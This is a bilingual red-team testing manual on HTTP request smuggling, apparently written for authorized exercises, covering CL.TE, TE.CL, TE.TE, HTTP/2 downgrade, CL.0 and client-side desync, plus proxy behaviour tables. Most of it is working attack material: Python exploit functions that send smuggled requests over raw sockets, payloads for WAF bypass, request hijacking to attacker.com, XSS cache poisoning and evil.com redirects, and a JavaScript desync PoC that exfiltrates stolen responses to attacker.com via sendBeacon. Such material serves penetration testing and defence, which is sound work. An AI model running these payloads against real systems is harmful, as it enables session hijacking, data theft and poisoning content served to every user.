# HTTP 协议族（CRLF / Host / 走私 / 缓存投毒）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---


> 结构：上半原有是主线（CL.TE / TE.CL）；下半补充 + 文末附件加深 H2。先时间差确认再走私。
>
> 与 `../hw-rules/workflow.md-hunting` 冲突时以 rules 为准。只能探到解析差、没有绕 WAF/劫持/投毒 → 默认不写。


## HTTP 请求走私测试手册

## 一、HTTP 请求走私原理

### 核心问题

前端服务器（CDN/负载均衡器）与后端服务器对 HTTP 请求边界的解析不一致。

```
客户端 → 前端服务器 → 后端服务器

前端: 用 Content-Length 判断请求结束
后端: 用 Transfer-Encoding 判断请求结束

结果: 前端认为是1个请求，后端认为是2个请求
     → 第2个请求被"走私"到后端
```

---

## 二、三种类型

### 2.1 CL.TE（Content-Length vs Transfer-Encoding）

**前端用 Content-Length，后端用 Transfer-Encoding**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**解析差异**:
- 前端: 读取 6 字节（`0\r\n\r\nG`），认为请求结束
- 后端: 看到 `Transfer-Encoding: chunked`，读取 `0\r\n\r\n`（结束标记），剩余 `G` 被当作下一个请求的开头

### 2.2 TE.CL（Transfer-Encoding vs Content-Length）

**前端用 Transfer-Encoding，后端用 Content-Length**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**解析差异**:
- 前端: 读取 chunked 编码直到 `0\r\n\r\n`，认为请求结束
- 后端: 只读取 4 字节（`5c\r\n`），剩余内容被当作下一个请求

### 2.3 TE.TE（Transfer-Encoding 混淆）

**两端都用 Transfer-Encoding，但可通过混淆绕过其中一端**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
...
0


```

**混淆方式**:
```
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked, x
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked
Transfer-encoding: chunked  (小写 e)
Transfer-Encoding : chunked  (冒号前有空格)
Transfer-Encoding: chunked   (末尾有空格)
Transfer-Encoding:[tab]chunked
```

---

## 三、检测方法

### 3.1 时间差检测

```python
import socket
import time

def detect_cl_te(host, port=443):
    """检测 CL.TE 走私"""
    
    # 构造走私请求
    smuggled = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    
    # 发送请求
    sock = socket.create_connection((host, port))
    if port == 443:
        import ssl
        sock = ssl.wrap_socket(sock)
    
    sock.sendall(smuggled.encode())
    
    # 立即发送第二个请求
    normal = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    sock.sendall(normal.encode())
    
    # 测量响应时间
    start = time.time()
    response = sock.recv(4096)
    elapsed = time.time() - start
    
    sock.close()
    
    # 如果响应延迟 > 10s，可能存在走私
    # 原因: 后端等待走私请求的剩余部分（"X" 后面的内容）
    if elapsed > 10:
        print(f"可能存在 CL.TE 走私（延迟 {elapsed:.2f}s）")
        return True
    
    return False
```

### 3.2 CL.TE 检测 Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

**预期行为**:
- 如果返回超时或 400 错误 → 可能存在 CL.TE
- 原因: 后端读取 chunked 编码，等待 `Q` 后面的数据

### 3.3 TE.CL 检测 Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**预期行为**:
- 如果返回超时 → 可能存在 TE.CL
- 原因: 后端读取 6 字节（`0\r\n\r\nX`），但前端已认为请求结束

### 3.4 smuggler.py 工具

```bash
# 安装
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h

# 自动检测
python3 smuggler.py -u https://target.com/

# 指定检测类型
python3 smuggler.py -u https://target.com/ -t CL.TE
python3 smuggler.py -u https://target.com/ -t TE.CL
```

---

## 四、利用场景

### 4.1 绕过前端安全控制（WAF/ACL）

```http
POST /admin HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /admin/deleteUser HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

userId=123
```

**效果**: 前端 WAF 只看到 `POST /admin`（可能允许），但后端实际执行 `POST /admin/deleteUser`（敏感操作）

### 4.2 请求劫持（捕获其他用户的请求）

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: attacker.com
Content-Length: 500

x=
```

**效果**: 下一个用户的请求会被拼接到 `x=` 后面，发送到 `attacker.com`

### 4.3 缓存投毒

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /static/js/app.js HTTP/1.1
Host: target.com
X-Ignore: X

HTTP/1.1 200 OK
Content-Type: application/javascript

alert('XSS')
```

**效果**: 将恶意响应缓存到正常 URL（`/static/js/app.js`），所有用户访问时触发 XSS

### 4.4 反射型 XSS 升级为存储型

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: target.com

```

**效果**: 走私的请求触发反射型 XSS，响应被缓存，变成存储型 XSS

### 4.5 绕过认证

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /internal/admin HTTP/1.1
Host: localhost
Authorization: Bearer INTERNAL_TOKEN

```

**效果**: 走私请求从内部发起，绕过外部认证检查

---

## 五、HTTP/2 降级走私

### 5.1 H2.CL（HTTP/2 → HTTP/1.1 + Content-Length）

```python
import h2.connection
import socket
import ssl

def h2_smuggling():
    # 建立 HTTP/2 连接
    sock = socket.create_connection(('target.com', 443))
    sock = ssl.wrap_socket(sock)
    
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    
    # 发送带有 Content-Length 的请求
    # HTTP/2 不应该有 Content-Length，但降级到 HTTP/1.1 时会保留
    headers = [
        (':method', 'POST'),
        (':path', '/'),
        (':authority', 'target.com'),
        (':scheme', 'https'),
        ('content-length', '100'),  # 恶意 Content-Length
    ]
    
    conn.send_headers(1, headers)
    conn.send_data(1, b'x' * 50)  # 只发送 50 字节
    
    sock.sendall(conn.data_to_send())
```

### 5.2 CRLF 注入在 HTTP/2 头部

```python
# HTTP/2 头部中注入 CRLF
headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('foo', 'bar\r\nTransfer-Encoding: chunked'),  # 注入
]

# 降级到 HTTP/1.1 时变成:
# GET / HTTP/1.1
# Host: target.com
# foo: bar
# Transfer-Encoding: chunked
```

---

## 六、实战 PoC

### 6.1 原始 Socket 发送

```python
import socket
import ssl

def send_smuggled_request(host, port, payload):
    """发送走私请求"""
    
    # 建立连接
    sock = socket.create_connection((host, port))
    if port == 443:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
    
    # 发送 payload
    sock.sendall(payload.encode())
    
    # 接收响应
    response = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except:
            break
    
    sock.close()
    return response.decode('utf-8', errors='ignore')

# CL.TE 走私示例
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

response = send_smuggled_request('target.com', 443, payload)
print(response)
```

### 6.2 完整 CL.TE 利用

```python
def exploit_cl_te(host, port=443):
    """CL.TE 走私攻击"""
    
    # 构造走私请求（访问管理员接口）
    smuggled = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 150\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    
    sock = socket.create_connection((host, port))
    if port == 443:
        sock = ssl.wrap_socket(sock, server_hostname=host)
    
    # 发送走私请求
    sock.sendall(smuggled.encode())
    
    # 发送正常请求（会被拼接到走私请求后）
    normal = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    sock.sendall(normal.encode())
    
    # 接收响应
    response = sock.recv(8192).decode('utf-8', errors='ignore')
    sock.close()
    
    return response
```

### 6.3 完整 TE.CL 利用

```python
def exploit_te_cl(host, port=443):
    """TE.CL 走私攻击"""
    
    # 计算 chunked 编码长度
    smuggled_request = (
        "GPOST /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    
    chunk_size = hex(len(smuggled_request))[2:]  # 转16进制
    
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{chunk_size}\r\n"
        f"{smuggled_request}\r\n"
        "0\r\n"
        "\r\n"
    )
    
    sock = socket.create_connection((host, port))
    if port == 443:
        sock = ssl.wrap_socket(sock, server_hostname=host)
    
    sock.sendall(payload.encode())
    response = sock.recv(8192).decode('utf-8', errors='ignore')
    sock.close()
    
    return response
```

---

## 七、Burp Suite 测试

### HTTP Request Smuggler 插件

```
1. 安装: Burp → Extender → BApp Store → HTTP Request Smuggler
2. 使用: 右键请求 → Extensions → Smuggle probe
3. 查看结果: 插件自动测试 CL.TE, TE.CL, TE.TE
```

### 手动测试步骤

```
1. 抓取正常请求
2. 修改为走私 payload
3. 发送到 Repeater
4. 观察响应时间和内容
5. 如果超时或异常 → 可能存在走私
```

---

## 八、防护检测

```python
# 检测是否有走私防护

# 1. 请求规范化
# 特征: 同时存在 CL 和 TE 时，服务器拒绝请求（400 Bad Request）

# 2. 前后端一致性
# 特征: 前后端使用相同的解析逻辑

# 3. HTTP/2 强制
# 特征: 不支持 HTTP/1.1，强制使用 HTTP/2

# 4. 严格的头部验证
# 特征: 拒绝畸形的 Transfer-Encoding 头
```

---

## 十、注意事项

1. **测试环境**: 优先在测试环境测试，生产环境谨慎
2. **影响范围**: 走私可能影响其他用户，测试时注意
3. **PoC 证据**: 保存完整的请求和响应
4. **及时报告**: 发现走私漏洞后立即报告，不要深入利用

---

## 竞态补充

### request-smuggling

### HTTP Request Smuggling

## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

---

## 1. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---

## 2. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.

---

## 3. TE.CL VULNERABILITIES

**Pattern**: front end parses **chunked**; back end only reads **`Content-Length`** (or too-short CL).

**Intent**: front end treats the whole malicious byte stream as body; back end reads only CL length, leaving remaining bytes buffered to splice with later legitimate requests.

**Full TE.CL with embedded second request** (same family as §0; `Content-Length: 4` + first chunk-length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Explanation:

- **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
- **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.

**Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.

---

## 4. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research/CTF approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

---

## 6. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

---

## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

---

## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

### Advanced Reference


---


## 附件：H2_SMUGGLING_VARIANTS

### HTTP/2 Smuggling Variants & Advanced Desync Techniques


## 1. H2.CL — HTTP/2 Content-Length Desync

### 1.1 Concept

The front-end speaks HTTP/2 with the client and downgrades to HTTP/1.1 toward the back-end. HTTP/2 frames have their own length field (frame length), but the proxy may also forward a `content-length` header to the back-end. If these disagree, the back-end trusts `content-length` while the front-end trusts the H2 frame boundary.

### 1.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - H2 DATA frame containing: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   - content-length header: 0

2. Front-end (H2): reads entire DATA frame as body of first request
   → forwards to back-end as HTTP/1.1 POST

3. Back-end (H1): sees content-length: 0
   → treats body as empty
   → remaining bytes become: "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   → parsed as second request
```

### 1.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.example

```

The H2 DATA frame carries the entire body including the smuggled `GET /admin` request. The `content-length: 0` header tells the back-end the POST body is empty.

### 1.4 Confirming H2.CL

```
Step 1: Send H2 POST with content-length: 0 and smuggled prefix "G"
Step 2: Follow immediately with normal GET / on same connection
Step 3: If back-end sees "GGET / HTTP/1.1" → 405 or error → confirmed

Timing version:
- Smuggle "GET /sleep?delay=10 HTTP/1.1..." 
- Subsequent request on same connection delayed → confirmed
```

---

## 2. H2.TE — HTTP/2 Transfer-Encoding Desync

### 2.1 Concept

HTTP/2 specification forbids `transfer-encoding` in H2 frames. However, some front-end proxies don't strip it when downgrading to H1. If the back-end sees `transfer-encoding: chunked` in the downgraded H1 request, it uses chunked parsing while the front-end used H2 frame boundaries.

### 2.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - transfer-encoding: chunked  (forbidden in H2, but proxy passes it through)
   - H2 DATA frame body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"

2. Front-end: ignores transfer-encoding (H2 doesn't use it)
   → forwards entire DATA frame as H1 body

3. Back-end: sees transfer-encoding: chunked
   → parses "0\r\n\r\n" as end-of-chunks
   → remaining bytes = smuggled request
```

### 2.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example

```

### 2.4 Variations

Some proxies normalize the `transfer-encoding` header. Try obfuscations:

```http
transfer-encoding: chunked
Transfer-Encoding: chunked      (capitalized — H2 requires lowercase)
transfer-encoding: identity     (should be stripped but may pass)
transfer-encoding:  chunked     (extra space)
transfer-encoding: chunked\r\n  (trailing whitespace)
```

---

## 3. CL.0 — CONNECTION CLOSE DESYNC

### 3.1 Concept

CL.0 occurs when the back-end ignores the `content-length` header entirely and reads the body length as 0 — regardless of what `content-length` says. The remaining body bytes stay in the socket buffer for the next request.

Unlike CL.TE or TE.CL, CL.0 does NOT require `transfer-encoding`. It exploits endpoints that simply don't consume the body.

### 3.2 Vulnerable Conditions

- Endpoints that return a response before reading the full body (e.g., redirects, 301/302)
- Static file servers that ignore POST body
- Health-check endpoints
- Endpoints behind `Connection: close` that reuse the socket anyway

### 3.3 Attack Flow

```
1. Send POST to endpoint that ignores body:
   POST /redirect-page HTTP/1.1
   Host: target.example
   Content-Length: 30

   GET /admin HTTP/1.1
   X: x

2. Back-end sends 301 redirect immediately without consuming body
3. The "GET /admin HTTP/1.1\r\nX: x" remains in socket buffer
4. Next request on this connection is prepended with smuggled bytes
```

### 3.4 Detection

```bash
### Step 1: Find endpoints that respond without consuming body
### Candidates: redirects, 204, static pages serving POST

### Step 2: Send POST with Content-Length larger than actual body
curl -X POST https://target.com/static-page \
  -H "Content-Length: 50" \
  -d "GET /canary HTTP/1.1\r\nHost: target.com\r\n\r\n" \
  --http1.1

### Step 3: Send follow-up request on same connection
### If response matches /canary instead of expected page → CL.0 confirmed
```

### 3.5 Key Differences from CL.TE

| Aspect | CL.TE | CL.0 |
|---|---|---|
| Requires TE header | Yes | No |
| Front/back disagreement | CL vs TE | CL vs "ignore body" |
| Works without chunked support | No | Yes |
| Common targets | Proxies parsing TE | Static servers, redirect endpoints |

---

## 4. FAT GET REQUEST SMUGGLING

### 4.1 Concept

Some reverse proxies allow GET requests with a body (RFC 7230 permits but discourages it). The front-end may forward the body, but the back-end may ignore it for GET requests, leaving body bytes in the buffer.

### 4.2 Payload

```http
GET / HTTP/1.1
Host: target.example
Content-Length: 55

GET /admin HTTP/1.1
Host: target.example
Cookie: admin=true

```

### 4.3 Behavior Matrix

| Proxy/Server | GET Body Behavior |
|---|---|
| Nginx (as proxy) | Forwards body to back-end |
| Apache (as proxy) | Usually forwards body |
| HAProxy | Forwards body by default |
| AWS ALB | May strip body on GET |
| Cloudflare | May strip body on GET |
| Express.js (back-end) | Ignores GET body by default |
| Gunicorn (back-end) | Ignores GET body |
| PHP-FPM | Ignores GET body |

When front-end forwards and back-end ignores → desync.

### 4.4 Combined with Cache

```http
GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 70

GET /admin/delete-user?id=1 HTTP/1.1
Host: target.example
Cookie: admin=true

```

If the proxy caches `/static/app.js` responses, the smuggled request's response may get cached under `/static/app.js`.

---

## 5. REQUEST SMUGGLING → CACHE POISONING CHAIN

### 5.1 The Chain

```
1. Attacker smuggles a request that returns malicious content
2. The smuggled response is associated with a cacheable URL by the front-end
3. Cache stores malicious response under legitimate URL
4. All subsequent users requesting that URL get poisoned content
```

### 5.2 CL.TE → Cache Poisoning Example

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 10

x=1
```

**What happens**:
1. Front-end (CL): sends everything as one POST request
2. Back-end (TE): sees POST end at `0\r\n\r\n`, then `GET /static/app.js` as new request
3. Back-end responds to smuggled `GET /static/app.js` — but its response gets matched to the **next legitimate request** on the same connection
4. If next legitimate request is for `/static/app.js` → cache stores the matched response → poisoned

### 5.3 Targeted Poisoning

To control WHAT gets cached, smuggle a request that returns attacker-controlled content:

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 200
Transfer-Encoding: chunked

0

GET /redirect?url=https://evil.com/malicious.js HTTP/1.1
Host: target.example
X-Ignore: x
```

If `/redirect` returns a 302 or 301 to `evil.com`, and the cache stores this for the next request's URL, that URL now redirects to `evil.com` for all users.

### 5.4 Cache Poisoning via Response Queue Misalignment

```
Connection:
  Request A (smuggled) → Response A
  Request B (victim's) → Response B

Cache expects:
  Request B's URL → Response B

Actual:
  Request B's URL → Response A (wrong response)
  
If Response A contains XSS or redirect → cached under Request B's URL
```

---

## 6. CLIENT-SIDE DESYNC (CSD)

### 6.1 Concept

Client-Side Desync exploits browser `fetch()` API behavior to cause desynchronization between the browser and a web server. Unlike server-side smuggling (which poisons a shared connection pool), CSD poisons the **browser's own connection** to the target.

### 6.2 Prerequisites

1. Target server reuses connections (not `Connection: close` on every response)
2. A page on the target (or same-site) where attacker can inject JavaScript
3. The server has an endpoint that doesn't consume the full request body (CL.0-style)

### 6.3 Detailed Flow

```
1. Attacker's JS on victim's browser sends fetch() to target:

   fetch('https://target.com/trigger', {
     method: 'POST',
     mode: 'no-cors',
     credentials: 'include',
     body: 'GET /victim-data HTTP/1.1\r\nHost: target.com\r\n\r\n'
   });

2. Browser sends POST to /trigger with body containing smuggled GET
3. Server responds to POST immediately (ignoring body — CL.0)
4. Smuggled "GET /victim-data" remains in the TCP buffer

5. Attacker's JS sends a follow-up request on same connection:

   fetch('https://target.com/api/me', {
     credentials: 'include'
   });

6. Server processes the leftover "GET /victim-data" instead of "GET /api/me"
7. Response mismatch — browser gets /victim-data response for /api/me request
```

### 6.4 JavaScript PoC Template

```javascript
async function desync(targetUrl, triggerPath, smuggledRequest) {
    const body = smuggledRequest;

    // Step 1: Trigger the desync (CL.0 on trigger endpoint)
    await fetch(targetUrl + triggerPath, {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: body
    });

    // Step 2: Follow-up request on (hopefully) same connection
    const response = await fetch(targetUrl + '/api/profile', {
        credentials: 'include'
    });

    // Step 3: Exfiltrate if response is mismatched
    const data = await response.text();
    navigator.sendBeacon('https://attacker.com/log', data);
}

desync(
    'https://target.com',
    '/static/logo.png',  // CL.0-susceptible endpoint
    'GET /admin/users HTTP/1.1\r\nHost: target.com\r\n\r\n'
);
```

### 6.5 CSD Limitations

- Browser may use different connections for subsequent requests → desync fails
- `Connection: close` on server side prevents reuse
- HTTP/2 to single origin may use single connection (actually helps CSD)
- Same-site cookie policies may limit credential inclusion
- Hard to reliably predict connection reuse

### 6.6 CSD via Pause-Based Desync

```
1. Server has a timeout: if request body isn't fully received within N seconds, 
   server sends response and moves on
2. Attacker sends fetch() with:
   - Content-Length: 1000 (large)
   - Actual body: only 50 bytes + smuggled request
3. Server waits, times out, responds to partial request
4. Remaining bytes (smuggled request) stay in buffer
5. Next request on connection processes smuggled bytes
```

---

## 7. CDN / REVERSE PROXY BEHAVIOR MATRIX

### 7.1 CL + TE Handling

| Product | Dual CL+TE | Prefers | Notes |
|---|---|---|---|
| **HAProxy** | Forwards both | TE | Strips CL when TE is present (configurable) |
| **Nginx** | Rejects dual headers (400) | N/A | Strict — hard to smuggle through |
| **Apache (mod_proxy)** | Forwards both | CL | Historic CL.TE source |
| **Cloudflare** | Normalizes | TE | Strips CL when TE present; strong normalization |
| **AWS ALB** | Normalizes | Varies | Has had CL.TE vulns historically (patched) |
| **AWS CloudFront** | Normalizes | CL | May pass TE obfuscation variants |
| **Varnish** | Forwards both | TE | Configurable; default prefers TE |
| **Traefik** | Forwards both | TE | Go `net/http` based; strict chunked parsing |
| **Envoy** | Rejects dual (400) | N/A | Very strict HTTP/1.1 parsing |
| **Caddy** | Go-based; strict | TE | Similar to Envoy strictness |
| **Squid** | Forwards both | CL | Historic TE.CL source |
| **IIS (ARR)** | Forwards both | CL | Historic CL.TE/TE.CL source |

### 7.2 HTTP/2 Downgrade Behavior

| Product | H2→H1 Downgrade | TE Header Handling | CL Passthrough |
|---|---|---|---|
| **HAProxy** | Translates | May pass TE | Passes CL |
| **Nginx** | Translates | Strips TE (usually) | Passes CL |
| **Cloudflare** | Translates | Strips TE | Normalizes CL |
| **AWS ALB** | Translates | Strips TE | Passes CL |
| **AWS CloudFront** | Translates | May pass obfuscated TE | Passes CL |
